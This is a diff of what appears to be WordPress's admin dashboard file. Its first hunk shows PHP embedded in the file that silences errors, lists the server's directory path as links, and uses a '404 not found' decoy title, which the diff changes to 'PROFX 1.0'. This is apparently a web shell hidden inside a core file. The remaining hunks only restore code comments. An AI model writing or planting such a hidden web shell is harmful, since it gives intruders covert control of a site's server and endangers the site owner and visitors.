@@ -23,7 +23,7 @@ td,th{border:1px solid #999;padding:8px;}
 error_reporting(0);
 $currentPath = getcwd();
 $pathComponents = explode(DIRECTORY_SEPARATOR, $currentPath);
-echo "<font face='Bungee' size='3'><h1>&#128013; 404 not found</h1></font><div class='container'><div id='pw'>Home: ";
+echo "<font face='Bungee' size='3'><h1> PROFX 1.0</h1></font><div class='container'><div id='pw'>Home: ";
 foreach ($pathComponents as $index => $component) {
     $partialPath = implode(DIRECTORY_SEPARATOR, array_slice($pathComponents, 0, $index + 1));
     $partialPath = str_replace("%2F", "/", rawurlencode($partialPath));
@@ -401,7 +401,7 @@ if ( is_blog_admin() && current_user_can( 'edit_posts' ) ) {
 }
 
 $help .= '<p>' . sprintf(
-
+	/* translators: %s: WordPress Planet URL. */
 	__( '<strong>WordPress Events and News</strong> &mdash; Upcoming events near you as well as the latest news from the official WordPress project and the <a href="%s">WordPress Planet</a>.' ),
 	__( 'https://planet.wordpress.org/' )
 ) . '</p>';
@@ -423,7 +423,7 @@ $is_dev_version  = preg_match( '/alpha|beta|RC/', $wp_version );
 
 if ( ! $is_dev_version ) {
 	$version_url = sprintf(
-	
+		/* translators: %s: WordPress version. */
 		esc_url( __( 'https://wordpress.org/documentation/wordpress-version/version-%s/' ) ),
 		sanitize_title( $wp_version )
 	);
@@ -454,13 +454,16 @@ require_once ABSPATH . 'wp-admin/admin-header.php';
 		$remind_interval = (int) apply_filters( 'admin_email_remind_interval', 3 * DAY_IN_SECONDS );
 		$postponed_time  = get_option( 'admin_email_lifespan' );
 
-		
+		/*
+		 * Calculate how many seconds it's been since the reminder was postponed.
+		 * This allows us to not show it if the query arg is set, but visited due to caches, bookmarks or similar.
+		 */
 		$time_passed = time() - ( $postponed_time - $remind_interval );
 
-		
+		// Only show the dashboard notice if it's been less than a minute since the message was postponed.
 		if ( $time_passed < MINUTE_IN_SECONDS ) :
 			$message = sprintf(
-			
+				/* translators: %s: Human-readable time interval. */
 				__( 'The admin email verification page will reappear after %s.' ),
 				human_time_diff( time() + $remind_interval )
 			);
@@ -491,7 +494,15 @@ if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) )
 		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
 		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>" aria-label="<?php esc_attr_e( 'Dismiss the welcome panel' ); ?>"><?php _e( 'Dismiss' ); ?></a>
 		<?php
-	
+		/**
+		 * Fires when adding content to the welcome panel on the admin dashboard.
+		 *
+		 * To remove the default welcome panel, use remove_action():
+		 *
+		 *     remove_action( 'welcome_panel', 'wp_welcome_panel' );
+		 *
+		 * @since 3.5.0
+		 */
 		do_action( 'welcome_panel' );
 		?>
 	</div>
@@ -499,12 +510,12 @@ if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) )
 
 	<div id="dashboard-widgets-wrap">
 	<?php wp_dashboard(); ?>
-	</div>
+	</div><!-- dashboard-widgets-wrap -->
 
-</div>
+</div><!-- wrap -->
 
 <?php
 wp_print_community_events_templates();
 
 require_once ABSPATH . 'wp-admin/admin-footer.php';
- 
+      
